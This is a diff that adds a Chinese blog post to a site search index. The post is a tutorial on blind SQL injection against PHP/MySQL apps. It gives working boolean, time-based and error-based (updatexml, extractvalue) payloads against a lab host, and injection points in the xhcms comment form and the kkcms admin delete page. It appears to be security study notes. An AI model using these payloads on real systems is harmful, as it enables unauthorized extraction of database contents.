@@ -2538,4 +2538,39 @@
         <tag>项目集合</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</title>
+    <url>/2024/03/17/Web%E6%94%BB%E9%98%B24/</url>
+    <content><![CDATA[<h2 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h2><p>1、功能：数据查询<br>查询：SELECT * FROM news where id&#x3D;$id</p>
+<p>2、功能：新增用户，添加新闻等<br>增加：INSERT INTO news (列名) VALUES (数据)</p>
+<p>3、功能：删除用户，删除新闻等<br>删除：DELETE FROM news WHERE id&#x3D;$id</p>
+<p>4、功能：修改用户，修改文章等<br>修改：UPDATE news SET id&#x3D;$id</p>
+<h2 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h2><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况</p>
+<p>我们可以知道盲注分为以下三类：<br>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p>
+<p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p>
+<p>3、基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue</p>
+<p>延迟（注意and有时候执行不了改成or）：<br>and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br><a href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br>如果数据库名demo01第一位等于d，所以延时5秒</p>
+<p>and if(length(database())&#x3D;6,sleep(5),sleep(0));<br><a href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(length(database())&#x3D;6,sleep(5),sleep(0));<br>如果数据库名demo01位数等于6，所以延时5秒</p>
+<p>布尔：<br>and length(database())&#x3D;7;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and length(database())&#x3D;7;<br>查询数据库demo01长度，是6位，等于7就没回显</p>
+<p>and left(database(),1)&#x3D;’p’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
+<p>and left(database(),2)&#x3D;’pi’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),2)&#x3D;’pi’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前两位等于de，所以没回显</p>
+<p>and substr(database(),1,1)&#x3D;’p’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),1,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第一位等于d，所以没回显</p>
+<p>and substr(database(),2,1)&#x3D;’i’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),2,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第二位等于e，所以没有数据</p>
+<p>and ord(left(database(),1))&#x3D;112;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and ord(left(database(),1))&#x3D;112;<br>适用的是ASCII码，防止引号过滤，11为p的ASCII码，查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
+<p>报错：<br>and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>updatexml 会触发一个 SQL 错误，从而报出错误</p>
+<p>and extractvalue(1, concat(0x5c, (select version())));<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and extractvalue(1, concat(0x5c, (select version())));<br>extractvalue 会触发一个 SQL 错误，从而报出错误</p>
+<p>更多：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p>参考：<br>like ‘ro%’            #判断ro或ro…是否成立<br>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等<br>if(条件,5,0)          #条件成立 返回5 反之 返回0<br>sleep(5)              #SQL语句延时执行5秒<br>mid(a,b,c)            #从位置b开始，截取a字符串的c位<br>substr(a,b,c)         #从位置b开始，截取字符串a的c长度<br>left(database(),1)，database() #left(a,b)从左侧截取a的前b位<br>length(database())&#x3D;8  #判断数据库database()名的长度<br>ord&#x3D;ascii ascii(x)&#x3D;97 #判断x的ascii码是否等于97</p>
+<h2 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h2><p>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要，没有报错和回显都能进行，适用于增删改查里面的增删改<br>and if(1&#x3D;1,sleep(5),0)</p>
+<p>基于布尔：数据库输出判断标准，需要数据回显才能用，仅适用于增删改查里面的查<br>and length(database())&#x3D;6</p>
+<p>基于报错：数据库报错处理判断标准，适用于增删改查里面的增（前提是有报错代码的漏洞例如：or die(mysqli_error($con))）<br>and updatexml(1,concat(0x7e,(SELECT version(),0x7e),1)</p>
+<h2 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h2><p>1、xhcms-insert报错，注入发表评论昵称处<br>‘ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and ‘</p>
+<p>2、kkcms-delete延时，先登录后台<br><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(1&#x3D;1,sleep(5),0)</p>
+<p><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(length(database())&#x3D;6,sleep(5),sleep(0))</p>
+<p><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(ord(left(database(),1))&#x3D;107,sleep(5),sleep(0))</p>
+]]></content>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
+  </entry>
 </search>
